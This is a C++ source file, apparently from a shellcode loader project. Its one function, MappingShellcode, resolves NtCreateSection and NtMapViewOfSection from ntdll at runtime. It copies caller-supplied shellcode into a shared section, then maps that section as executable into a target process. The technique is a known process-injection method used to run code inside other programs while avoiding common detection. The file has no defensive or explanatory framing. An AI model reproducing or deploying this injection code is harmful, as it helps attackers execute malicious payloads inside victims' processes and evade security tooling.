#include "MemoryMapping.h"
#include "ResolveApi.h"
#include <iostream>

bool MappingShellcode(_In_ HANDLE hTargetProcess,_In_ LPVOID lpShellcode,_In_ DWORD dwShellSize, _Out_ LPVOID* lpRemoteAddr) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == nullptr) { return false; }
	pNtCreateSection ntCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	if (ntCreateSection == nullptr) { return false; }
	NTSTATUS ntStatus;
	HANDLE hSection = nullptr;
	LARGE_INTEGER size;
	size.QuadPart = dwShellSize;
	ntStatus = ntCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
	if (!NT_SUCCESS(ntStatus) || hSection == nullptr) { return false; }
	pNtMapViewOfSection ntMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	if (ntMapViewOfSection == nullptr) { return false; }
	PVOID pLocalAddr = nullptr;
	SIZE_T viewSize = dwShellSize;
	ntStatus = ntMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&pLocalAddr,
		0,
		0,
		nullptr,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(ntStatus)) { 
		CloseHandle(hSection);
		return false; 
	}

	memcpy(pLocalAddr, lpShellcode, dwShellSize);

	viewSize = dwShellSize;
	ntStatus = ntMapViewOfSection(
		hSection,
		hTargetProcess,
		lpRemoteAddr,
		0,
		0,
		nullptr,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READ
	);
	if (!NT_SUCCESS(ntStatus)) { 
		CloseHandle(hSection);
		return false; 
	}

	return true;
}